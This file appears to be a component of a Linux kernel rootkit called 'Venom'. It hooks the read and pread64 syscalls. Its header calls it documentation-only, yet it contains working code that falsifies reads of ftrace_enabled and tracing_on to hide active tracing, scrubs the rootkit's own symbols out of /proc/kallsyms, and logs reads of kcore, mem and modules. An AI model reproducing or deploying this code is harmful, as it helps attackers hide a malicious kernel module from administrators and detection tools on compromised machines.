/*
 * Venom 
 * ---------------------------------------------------------------------------
 * File: read.c
 *
 * Purpose:
 *  - High-level notes on the read(2) syscall path and how interception or
 *    sanitisation of reads can change host-observable behavior (files,
 *    /proc, sockets, pipes). Hooks read, pread 
 *
 * Contents (documentation-only):
 *  - Hooks read syscalls to prevent ftrace bypasses
 * 
 * Author: Trevohack 
 */



#ifndef READ_HACK_H
#define READ_HACK_H

#include "../include/headers.h"


static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);


static int spoof_next_read = 0;


static const char *read_protected_files[] = {
    "ftrace_enabled",
    "tracing_on",
    "kallsyms",
    "modules",
    "kcore",
    "System.map",
    NULL
};



notrace static int custos_read(const char *name) {
    int i;
    if (!name) return 0;
    
    for (i = 0; read_protected_files[i] != NULL; i++) {
        if (strcmp(name, read_protected_files[i]) == 0)
            return 1;
    }
    return 0;
}

notrace static char *get_file_path(int fd, char *buf, size_t size) {
    struct file *file;
    char *path = NULL;
    
    file = fget(fd);
    if (file) {
        path = d_path(&file->f_path, buf, size);
        fput(file);
    }
    
    return IS_ERR(path) ? NULL : path;
}


notrace static void sanitize_kallsyms(char *buf, size_t len) {
    char *line = buf;
    char *next;
    
    while (line && *line && (size_t)(line - buf) < len) {
        next = strchr(line, '\n');
        

        if (strstr(line, "venom") || 
            strstr(line, "VENOM")) {
            if (next) {
                memset(line, '0', 16); 
            }
        }
        
        line = next ? next + 1 : NULL;
    }
}


notrace static ssize_t read_vigila(int fd, char __user *user_buf, size_t count, 
                          loff_t *pos, ssize_t (*original_read)(const struct pt_regs *),
                          const struct pt_regs *regs) {
    struct file *file;
    char *kernel_buf;
    ssize_t bytes_read;
    char path_buf[256];
    char *path;
    
    file = fget(fd);
    if (!file)
        goto call_original;
    

    if (file->f_path.dentry && file->f_path.dentry->d_name.name) {
        const char *name = file->f_path.dentry->d_name.name;
        

        if (strcmp(name, "ftrace_enabled") == 0 || 
            strcmp(name, "tracing_on") == 0) {
            
            fput(file);
            bytes_read = original_read(regs);
            
            if (bytes_read <= 0)
                return bytes_read;
            
            kernel_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
            if (!kernel_buf)
                return bytes_read;
            
            if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
                kfree(kernel_buf);
                return bytes_read;
            }
            

            if (spoof_next_read == 0 && bytes_read > 0 && kernel_buf[0] == '1') {
                kernel_buf[0] = '0';
                spoof_next_read = 1;
                TLOG_INF("[VENOM] Spoofed ftrace read from PID %d", current->pid);
            } else {
                spoof_next_read = 0;
            }
            
            if (copy_to_user(user_buf, kernel_buf, bytes_read)) {
                kfree(kernel_buf);
                return -EFAULT;
            }
            
            kfree(kernel_buf);
            return bytes_read;
        }
        

        if (strcmp(name, "kallsyms") == 0) {
            fput(file);
            
            bytes_read = original_read(regs);
            if (bytes_read <= 0)
                return bytes_read;
            
            kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
            if (!kernel_buf)
                return bytes_read;
            
            if (copy_from_user(kernel_buf, user_buf, bytes_read) == 0) {
                kernel_buf[bytes_read] = '\0';
                sanitize_kallsyms(kernel_buf, bytes_read);
                copy_to_user(user_buf, kernel_buf, bytes_read);
                TLOG_INF("[VENOM] Sanitized kallsyms read from %s", current->comm);
            }
            
            kfree(kernel_buf);
            return bytes_read;
        }
        
        if (strcmp(name, "modules") == 0 || 
            strcmp(name, "kcore") == 0 ||
            strcmp(name, "mem") == 0) {
            
            path = get_file_path(fd, path_buf, sizeof(path_buf));
            TLOG_WARN("[VENOM] Read: %s by %s (PID:%d)", path ? path : name, current->comm, current->pid);
        }
    }
    
    fput(file);
    
call_original:
    return original_read(regs);
}

notrace static asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
    int fd = regs->di;
    char __user *buf = (char __user *)regs->si;
    size_t count = regs->dx;
    
    return read_vigila(fd, buf, count, NULL, orig_read, regs);
}


notrace static asmlinkage ssize_t hooked_pread64(const struct pt_regs *regs) {
    int fd = regs->di;
    char __user *buf = (char __user *)regs->si;
    size_t count = regs->dx;
    loff_t pos = regs->r10;
    
    return read_vigila(fd, buf, count, &pos, orig_pread64, regs);
}



#endif 
